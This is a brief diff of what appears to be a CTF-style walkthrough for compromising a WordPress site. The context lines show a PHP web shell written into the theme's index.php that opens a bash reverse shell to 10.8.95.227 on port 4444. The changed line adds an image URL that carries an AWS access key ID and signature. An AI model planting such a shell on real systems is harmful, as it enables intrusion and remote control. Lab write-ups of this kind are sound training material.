@@ -44,7 +44,7 @@ We got username and password, so let's login in wordpress.
 
 In theme editor, we will write our shell in `index.php`
 
-![](https://hackmd.io/_uploads/rJmF_ljU2.png)
+![](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2ae824d5ff3519e3a5301cf60a84aa07.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1685980308&Signature=cEoGorX5b91fQlXrZYEtP566xpA%3D)
 
 `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.95.227/4444 0>&1'"); ?>`
 
